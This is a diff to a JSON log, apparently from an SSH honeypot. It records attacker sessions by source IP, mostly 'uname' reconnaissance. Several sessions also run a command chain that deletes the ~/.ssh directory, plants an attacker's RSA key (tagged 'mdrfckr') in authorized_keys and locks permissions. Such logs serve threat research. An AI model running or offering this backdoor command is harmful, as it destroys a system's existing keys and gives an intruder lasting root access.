@@ -27,6 +27,24 @@
             "session": "40c627633b44"
         },
         {
+            "timestamp": "2023-11-12T01:18:38.190802Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "b849351d20d2"
+        },
+        {
+            "timestamp": "2023-11-12T01:23:38.195733Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "d9e42e26277d"
+        },
+        {
+            "timestamp": "2023-11-12T01:42:51.929974Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "99807bd2cf49"
+        },
+        {
             "timestamp": "2023-11-11T20:00:05.666551Z",
             "event": "command_input",
             "input": "uname -s -v -n -r -m",
@@ -319,10 +337,118 @@
             "session": "94bc51950307"
         },
         {
+            "timestamp": "2023-11-12T01:46:33.685080Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "ebfaf0942f93"
+        },
+        {
+            "timestamp": "2023-11-12T01:51:40.604742Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "a98bc1fff842"
+        },
+        {
+            "timestamp": "2023-11-12T01:56:47.000997Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "7d99d7bf5a1b"
+        },
+        {
+            "timestamp": "2023-11-12T02:01:53.130653Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "42bbd0de9480"
+        },
+        {
+            "timestamp": "2023-11-12T02:06:59.828933Z",
+            "event": "command_input",
+            "input": "uname -s -v -n -r -m",
+            "session": "69cc64e7ebd9"
+        },
+        {
             "timestamp": "2023-11-03T12:47:10.356284Z",
             "event": "command_input",
             "input": "uname -s -v -n -r -m",
             "session": "4ee41612b36a"
+        }
+    ],
+    "134.209.118.87": [
+        {
+            "timestamp": "2023-11-12T01:49:19.452008Z",
+            "event": "command_input",
+            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+            "session": "100b9bd3bbdb"
+        },
+        {
+            "timestamp": "2023-11-12T01:49:19.722026Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "100b9bd3bbdb"
+        },
+        {
+            "timestamp": "2023-11-12T01:49:19.805694Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "100b9bd3bbdb"
+        }
+    ],
+    "138.68.9.99": [
+        {
+            "timestamp": "2023-11-12T01:58:50.411481Z",
+            "event": "command_input",
+            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+            "session": "13c37ab27f64"
+        },
+        {
+            "timestamp": "2023-11-12T01:58:50.515473Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "13c37ab27f64"
+        },
+        {
+            "timestamp": "2023-11-12T01:58:50.532470Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "13c37ab27f64"
+        },
+        {
+            "timestamp": "2023-11-12T02:05:30.772506Z",
+            "event": "command_input",
+            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+            "session": "6e1d85261f06"
+        },
+        {
+            "timestamp": "2023-11-12T02:05:30.841113Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "6e1d85261f06"
+        },
+        {
+            "timestamp": "2023-11-12T02:05:30.858846Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "6e1d85261f06"
+        }
+    ],
+    "68.168.132.152": [
+        {
+            "timestamp": "2023-11-12T02:06:22.438181Z",
+            "event": "command_input",
+            "input": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+            "session": "04956b13a53e"
+        },
+        {
+            "timestamp": "2023-11-12T02:06:23.236571Z",
+            "event": "command_input",
+            "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+            "session": "04956b13a53e"
+        },
+        {
+            "timestamp": "2023-11-12T02:06:23.882045Z",
+            "event": "file_download",
+            "details": "File downloaded: /root/.ssh/authorized_keys (SHA-256: a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2)",
+            "session": "04956b13a53e"
         }
     ],
     "189.112.0.11": [
